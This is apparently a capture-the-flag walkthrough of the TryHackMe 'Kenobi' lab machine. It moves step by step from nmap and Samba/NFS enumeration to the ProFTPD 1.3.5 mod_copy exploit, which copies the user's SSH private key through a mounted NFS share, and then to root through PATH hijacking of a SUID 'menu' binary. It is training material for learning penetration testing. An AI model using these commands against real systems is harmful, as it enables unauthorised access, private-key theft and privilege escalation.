---
URL: https://tryhackme.com/r/room/kenobi
Machine IP: 10.10.166.119
---
### Initial Port Scan

We will first run a namp scan on the machine to figure out the opened ports and save it under `nmap/initial`.

```bash
$ nmap -sC -sV -vv -oN nmap/initial 10.10.166.119
```

From the nam result below, we can see that 7 ports are opened in the machine. We can also see that Samba is running on port **445**.

```bash
# Nmap 7.94SVN scan initiated Wed Apr 17 19:38:36 2024 as: nmap -sC -sV -vv -oN nmap/initial 10.10.166.119
Increasing send delay for 10.10.166.119 from 0 to 5 due to 103 out of 342 dropped probes since last increase.
Nmap scan report for 10.10.166.119
Host is up, received syn-ack (0.28s latency).
Scanned at 2024-04-17 19:38:36 AEST for 49s
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack ProFTPD 1.3.5
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F+Cdeme1O+vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8=
|   256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o/h9e6Ea/9kHMT0Dz2GqSodFqIWDi
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Site doesn't have a title (text/html)'.
111/tcp  open  rpcbind     syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37079/tcp   mountd
|   100005  1,2,3      50224/udp   mountd
|   100005  1,2,3      51497/udp6  mountd
|   100005  1,2,3      55229/tcp6  mountd
|   100021  1,3,4      36499/tcp6  nlockmgr
|   100021  1,3,4      40305/tcp   nlockmgr
|   100021  1,3,4      46806/udp   nlockmgr
|   100021  1,3,4      47465/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs         syn-ack 2-4 (RPC #100003)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumerating Samba 

We can use namp scripts to enumerate for samba shares and users.

```bash
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.166.119
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 19:42 AEST
Nmap scan report for 10.10.166.119
Host is up (0.30s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.166.119\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.166.119\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.166.119\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 45.78 seconds
```

Based on the output of the above command, we see that there are 3 Samba shares available; *IPC*, *anonymous*, and *print*.

We can connect to the anonymous share using `smbclient` and list down available files.

```bash
$ smbclient //10.10.166.119/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 20:49:09 2019
  ..                                  D        0  Wed Sep  4 20:56:07 2019
  log.txt                             N    12237  Wed Sep  4 20:49:09 2019

		9204224 blocks of size 1024. 6877104 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (9.2 KiloBytes/sec) (average 9.2 KiloBytes/sec)
```

We see a log.txt file available in the share. Inspecting the file after downloading it shows us this is a configuration file for *ProFTPD*.

```bash
$ cat log.txt     
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key\'s randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"ProFTPD Default Installation"
ServerType			standalone
DefaultServer			on

# Port 21 is the standard FTP port.
Port				21
.
.
```

### ProFTPD 1.3.5 Exploit

Based on the log file and the initial scan from nmap, we know a **ProFTDP** server running `version 1.3.5` is available on port 21. Searching for exploits for this particular version with searchsploit gives us the following results.

```bash
$ searchsploit proFtpd 1.3.5       
--------------------------------------------------------- ------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)| linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution      | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)  | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                | linux/remote/36742.txt
--------------------------------------------------------- -------------
Shellcodes: No Results
```

There seems to be a `mod_copy` module related exploit where any unauthenticated user can copy files from any part of the system to a chosen destination ([more info](https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/)). This is done by using the `SITE CPFR` and `SITE CPTO` command.

### rpcbind

However, we should now find a way to access a directory on the server based on the set of available ports before copying information using the ProFTPD vulnerability. From the nmap scan, under port 111 we noticed that rcpbind is running with access to `nfs`. We can use nmap scripts to enumerate this and find if there are any mounts.

```bash
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.166.119 -oN nmap/rpcbind
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 20:07 AEST
Nmap scan report for 10.10.166.119
Host is up (0.30s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 4.66 seconds
```

From the nmap result we see that `/var` is mount is available. We can go forward and mount `/var/tmp` to our machine.

```bash
$ sudo mkdir /mnt/kenobiNFS
$ sudo mount 10.10.166.119:/var /mnt/kenobiNFS
$ ls -la /mnt/kenobiNFS
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Apr 17 20:09 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 13  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 27  2019 mail
drwxr-xr-x  2 root root  4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 30  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Apr 17 19:31 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
```

We have now successfully created a network mount on our local machine. We can now use this directory to exfiltrate data using the ProFTPD exploit.

### Data Exfiltration

We can copy the kenobi user's `id_rsa` file to the `/var/tmp` directory. However, we must first connect to the FTP server to issue the `SITE CPFR` and `SITE CPTO` commands.

```bash
$ nc 10.10.166.119 21                                                                
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.166.119]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Now we just need to copy this from the network mount to our machine, change permissions, and use it to SSH to the machine.

```bash
$ cp /mnt/kenobiNFS/tmp/id_rsa .
$ ls                   
id_rsa  log.txt
$ chmod 600 id_rsa
$ ssh -i id_rsa kenobi@10.10.166.119 
The authenticity of host '10.10.166.119 (10.10.166.119)' can\'t be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:29: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.166.119' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 
```

Now we have successfully logged in as the kenobi user. Next step is to escalate our privileges.

### PrivEsc

We can scan the machine to find if there are any binaries running with the `SUID` bit set.

```bash
kenobi@kenobi:~$ find / -perm -04000 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

There is a binary named `/usr/bin/menu`, which is not one of the ordinary binaries we normally see in a Linux machine. We can try running it and see what happens.

```bash
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Wed, 17 Apr 2024 10:23:30 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

It seems like a piece of custom code running a few functions to get system information. We can use the `strings` command to find readable strings inside the binary.

```bash
kenobi@kenobi:~$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
.
.
```

We see that the binaries `curl, uname, ifconfig` are called without the full path of the files. eg: `/usr/bin/curl`. We can manipulate `PATH` variables to force the `menu` binary to use our version of one of the above mentioned binaries.

```bash
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/bash > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

After we setup the file and the path variables, we simply need to run the `/usr/bin/menu` file and select the function that uses the `curl` command, which is `1`. 

Since the binary runs with root permissions, when we open the bash shell, it opens as the root giving us root privileges.

